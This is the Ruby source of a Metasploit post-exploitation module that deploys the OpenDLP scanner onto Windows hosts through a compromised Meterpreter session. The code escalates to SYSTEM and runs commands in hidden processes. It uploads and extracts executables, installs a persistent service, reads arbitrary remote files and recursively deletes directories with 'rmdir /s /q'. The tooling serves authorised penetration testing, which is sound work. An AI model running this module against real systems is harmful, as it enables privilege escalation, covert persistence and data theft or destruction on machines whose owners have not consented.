=begin
Copyright (c) 2012, N2 Net Security, Inc.
http://www.n2netsec.com
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
      this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
      this list of conditions and the following disclaimer in the documentation
      and/or other materials provided with the distribution.

    * Neither the name of N2 Net Security, Inc. nor the names of its contributors
      may be used to endorse or promote products derived from this software
      without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
=end

=begin
NOTE: 	THIS FILE MUST USE TABS (NOT EXPANDED), INDENT LEVEL OF 4, AND NO TRAILING SPACES
		BEFORE CHECKING THE FILE IN, IT MUST PASS msftidy.rb:
		<MSF>/tools/msftidy.rb opendlp.rb
		REFERENCES:
		<MSF>/HACKING
		https://github.com/rapid7/metasploit-framework/wiki/Style-Tips
=end

require 'msf/core'
require 'rex'
require 'metasm'
require 'msf/core/post/windows/priv'
require 'base64'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Priv
	include Msf::Auxiliary::Report # used for db support
	include Msf::Post::Windows::WindowsServices # eliminates the dependency on sc.exe

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Deploy OpenDLP',
			'Description'   => %q{
				OpenDLP deployment module
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'Michael Baucom  <mcbaucom[at]gmail.com> and Charles Smith <charles.smith[at]n2netsec.com' ],
			'Version'       => '$Revision: 2 $',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'References'    => [
				[ 'URL', 'http://www.secmaniac.com/december-2010/bypass-windows-uac/' ]
			],
			'DisclosureDate'=> "Apr 15, 2012"
		))

		register_options([
			OptString.new("ACTION",     [ true, "The ACTION to be performed (START|STOP|DELETE|DEPLOY|REMOVE|READFILE)", nil]),
			OptString.new("REMOTE_PATH",[ false, "The remote directory base for deployment", nil]),
			OptString.new("SOURCE_PATH", [ false, "The directory on Metasploit where the deployment files are located", nil]),
			OptRaw   .new("CONFIG_STRING",[false, "A base 64 encoded string containing the contents of a config.ini file for deployment", nil]),
			OptString.new("FILE_TO_READ", [false, "A file to read on the remote system. Must contain complete path and filename. Required for READFILE action.", nil]),
			OptString.new("VERBOSE",[false,"The verbosity level", "0"]),
		])


	end

	# Check whether or not the session supports this module
	def session_valid?
		# we only support windows
		if client.platform !~ /win32|win64/i
			print_error("This version of Meterpreter is not supported by this module")
			return false
		else
			return true
		end
	end

	# Simply takes an array of filenames and uploads them to the remote system
	# files - an array of filename (no path)
	# lpath - the local path for the file to upload
	# rpath - the remote path of the file to upload
	def upload_files(files, lpath, rpath)
		for file in files
			begin
				lfilename=::File.join(lpath,file)
				rfilename=::File.join(rpath,file)
				if (!::File.exists?(lfilename))
					raise "File does not exist on the Metasploit system."
				end
				session.fs.file.upload_file(rfilename, lfilename)
				print_status("\"#{lfilename}\" uploaded to \"#{rfilename}\"...")
			rescue ::Exception => e
				raise ("Error uploading file \"#{lfilename}\": [#{e.class}] #{e}")
			ensure
				session.fs.dir.chdir(@resetDir) if not @resetDir.nil?
			end
		end
	end

	def download_file(file, localpath, remotepath)
		begin
			localfile  = ::File.join(localpath, file)
			remotefile = ::File.join(remotepath, file)
			session.fs.file.download_file(localfile, remotefile)
			print_status("\"#{remotefile}\" downloaded to \"#{localfile}\"...")
		rescue ::Exception => e
			raise ("Error downloading file \"#{remotefile}\": [#{e.class}] #{e}")
		ensure
			session.fs.dir.chdir(@resetDir) if not @resetDir.nil?
		end
	end

	def action_read_file(remotefile)
		begin
			filedata = "";
			file = session.fs.file.new("#{remotefile}", "rb")
			until file.eof?
				filedata << file.read
			end
			file.close
			print("[***BEGIN FILE DATA***]")
			print(filedata)
			print("[***END FILE DATA***]\n")
		rescue ::Exception => e
			raise ("Error reading file \"#{remotefile}\": #{e}")
		ensure
			session.fs.dir.chdir(@resetDir) if not @resetDir.nil?
		end
	end


	# This is a hack because Meterpreter doesn't support exists?(file)
	def dir_entry_exists(path)
		begin
			files = session.fs.dir.entries(path)
			return path
		rescue
			return nil
		end
	end

	def file_exists(path)
		begin
			files = session.fs.file.stat(path)
			return path
		rescue
			return nil
		end
	end

	# Create the path on the remote system if it does not exist
	def create_remote_path(path)
		if (path.nil? or path.empty?)
			raise ("No remote path specified. Aborting deployment.")
		end

		if (dir_entry_exists(path))
			raise ("Directory already exists on target system. Skipping deployment and scan attempt for this target.")
		end

		parts=path.split(/[\/\\]/)
		for i in 0..(parts.length-1)
			tmpPath=parts[0..i].join("\\")
			if dir_entry_exists(tmpPath) == nil
				print_status("#{tmpPath} does not exist, creating it") if @verbose
				session.fs.dir.mkdir(tmpPath)
			else
				print_status("#{tmpPath} exists") if @verbose
			end
		end
	end


	# only supports meterpreter sessions
	def write_file_to_target(remotedir,filename, data)
		fn = ::File.join(remotedir,filename)
		fd = session.fs.file.new(fn, "w")
		fd.write(data)
		fd.close
	end

	# run the command and return the handle to the process
	# by default, the exe will be run channelized, therefore, the channel
	# must be closed by the caller.
	# If there is an impersonated token stored, it uses that one first, otherwise
	# tries to grab the current thread token, then the process token
	def run_cmd(cmd,channelized=true,useThreadToken=true)
		opts =	{'Hidden' => true,
				'Channelized' => channelized,
				'UseThreadToken' => useThreadToken}

		if (session.sys.config.getuid() !~ /SYSTEM/)
			get_system()
		end

		print_status("Attempting to execute #{cmd}") if @verbose
		process = session.sys.process.execute(cmd, nil, opts)
		return process
	end

	# Attempt to elevate priviledges to system
	# raises an exception if it fails to get system
	def get_system
		print_status("Checking system status.")
		if (session.sys.config.getuid() !~ /SYSTEM/)
			print_status("Attempting to get system.")
			begin
				results = session.priv.getsystem
				if (results[0])
					print_status("Got system.")
				else
					raise ("Could not get system, insufficent permissions to deploy to this target.")
				end
			rescue
				raise ("Could not get system, insufficent permissions to deploy to this target.")
			end
		else
			print_status("Already system.")
			return 0
		end
	end

	# writes data to the processes channel
	def cmd_write(process, cmd, prompt=/.*>$/)
		print_status("Command Written: #{cmd}") if @verbose
		process.channel.write(cmd)
		cmd_read(process, prompt)
	end

	# reads data from the processes channel
	def cmd_read(process,prompt=/.*>$/)
		res = ""
		while (d = process.channel.read)
			print_status(d) if @verbose
			res << d
			break if d =~ prompt
		end
		return res
	end

	# action_stop attempts to stop the service.  The service will
	# remain installed until a service_delete is issued
	def action_stop()
		begin
			result = service_stop("OpenDLP")
			if (result <= 1)
				print_status("Success: Service Stopped")
			else
				raise ("Error: Service cannot be stopped")
			end
		rescue ::Exception => e
			raise ("Error stopping OpenDLP service: [#{e.class}] #{e}")
		end
		return 0
	end

	# action_start assumes that the service has been deployed.  It will
	# not install the service if it has not been installed.
	def action_start()
		begin
			val = service_start("OpenDLP")
			if (val <= 1)
				print_status("Success: OpenDLP service started")
			else
				raise ("Error starting OpenDLP service")
			end
		rescue ::Exception => e
			raise ("Error starting OpenDLP service: [#{e.class}] #{e}")
		ensure
			session.fs.dir.chdir(@resetDir) if not @resetDir.nil?
		end
		return 0
	end

	# Delete the OpenDLP service from the scm
	def action_delete()
		begin
			result = service_delete("OpenDLP")
			print_status("Success: OpenDLP service deleted")
		rescue ::Exception => e
			raise ("Error deleting OpenDLP service: [#{e.class}] #{e}")
		ensure
			session.fs.dir.chdir(@resetDir) if not @resetDir.nil?
		end
		return 0
	end

	# Remove all files related to OpenDLP on the target machine
	def action_remove()
		if (@remotepath.nil? or @remotepath.empty?)
			raise ("REMOTE_PATH is required for this action.")
		end

		if (dir_entry_exists(@remotepath) == nil)
			print_status("Success: Remote path already deleted.")
			return 0
		end

		begin
			session.fs.dir.chdir(@resetDir);
			session.sys.process.execute("cmd.exe /c rmdir /s /q \"#{@remotepath}\"", nil, {'Hidden' => true})
			select(nil,nil,nil,1)
			if dir_entry_exists(@remotepath) != nil
			raise ("Error: Failed to delete remote path \"#{@remotepath}\"")
			else
			print_status("Success: Remote path deleted.")
			end
		rescue ::Exception => e
			raise ("Error removing \"#{@remotepath}\": [#{e.class}] #{e}")
		end
		return 0
	end

	# Deploys the service by uploading the files necessary for starting the service,
	# it does not start the service
	def action_deploy()
		begin
			if (@remotepath.nil? or @remotepath.empty?)
				raise ("REMOTE_PATH is required for this action.")
			end

			if (@sourcepath.nil? or @sourcepath.empty?)
				raise ("SOURCEE_PATH is required for this action.")
			end

			if (@configstring.nil? or @configstring.empty?)
				raise ("CONFIG_STRING is required for this action.")
			end

			# checks the remote path and creates if necessary
			create_remote_path(@remotepath)

			# the files to be uploaded
			# get paths for files
			files=["OpenDLPz.exe", "server.pem", "client.pem"]
			upload_files(files, @sourcepath, @remotepath)

			# writes out the config file to disk
			print_status("Decoding CONFIG_STRING") if @verbose
			decodedstring = Base64.decode64(@configstring)
			print_status("Writing decoded string to config.ini") if @verbose
			write_file_to_target(@remotepath, "config.ini", decodedstring)
			print_status("Wrote config.ini file")

			print_status("Extracting OpenDLPz.exe")


			session.fs.dir.chdir(@remotepath)
			session.sys.process.execute("cmd.exe /c OpenDLPz.exe x -y -o\"#{@remotepath}\"\n", nil, {'Hidden' => true})
			sleep(1)
			if file_exists("#{@remotepath}\\OpenDLP.exe") == nil
				print_status("Waiting for extraction to complete.")
				sleep(3) # wait a little bit longer
				if file_exists("#{@remotepath}\\OpenDLP.exe") == nil
					raise("Error extracting OpenDLPz.exe")
				end
			else
				print_status("Extracted!")
			end

			print_status("Creating OpenDLP service")
			result = service_create("OpenDLP", "OpenDLP","\"#{@remotepath}\\OpenDLP.exe\"")
			print_status("Success: Deployed the service")
		rescue ::Exception => e
			raise ("Error: Service not deployed: [#{e.class}] #{e}")
		ensure
			# change back to previous directory
			session.fs.dir.chdir(@resetDir) if not @resetDir.nil?

		end
	end

	def run
		# check to see if the invocation is valid
		if !session_valid?
			print_error("Invalid session.")
			return
		end

		# Check to make sure we have permissions
		get_system()

		# get the arguments
		action  = datastore["ACTION"]
		@resetDir = "/"
		@sourcepath   = datastore["SOURCE_PATH"]
		@configstring = datastore["CONFIG_STRING"]
		@remotepath   = datastore["REMOTE_PATH"]
		@file_to_read = datastore["FILE_TO_READ"]
		if (datastore["VERBOSE"] == "1" || datastore["VERBOSE"] =~ /true/i)
			@verbose = true
		end
		sessionid     = datastore["SESSION"]

		begin
			case action
				when /deploy/i
					print_status("Attempting to Deploy OpenDLP Service...")
					action_deploy()  #deploys but does not start the service.
					action_start()
				when /start/i
					print_status("Attempting to Start OpenDLP Service...")
					action_start()
				when /stop/i
					print_status("Attempting to Stop OpenDLP Service...")
					action_stop()
				when /delete/i
					print_status("Attempting to Stop OpenDLP Service...")
					action_stop()
					print_status("Attempting to Delete OpenDLP Service...")
					action_delete()
				when /remove/i
					print_status("Attempting to remove OpenDLP files...")
					action_remove()
				when /readfile/i
					action_read_file(@file_to_read)
				when /test/i
					print_status("TESTING ONLY")
					print_status("REMOTE_PATH   = #{@remotepath}")
					print_status("SOURCE_PATH   = #{@sourcepath}")
					print_status("CONFIG_STRING = #{@configstring}")
					print_status("SESSION       = #{sessionid}")
					if dir_entry_exists(@remotepath) != nil
						print_status("Remote Directory \"#{@remotepath}\" exists.")
					end
					if (@configstring.nil? or @configstring.empty?)
						print_status("CONFIG_STRING_DECODED: ")
					else
						decodedstring = Base64.decode64(@configstring)
						print_status("CONFIG_STRING_DECODED: #{decodedstring}")
					end
					print_status "VERBOSE TRUE" if @verbose

				else
					raise ("Unsupported ACTION=#{action}")
			end #case
		rescue ::Exception => e
			print_error("#{e}")
		end #begin
	end
end
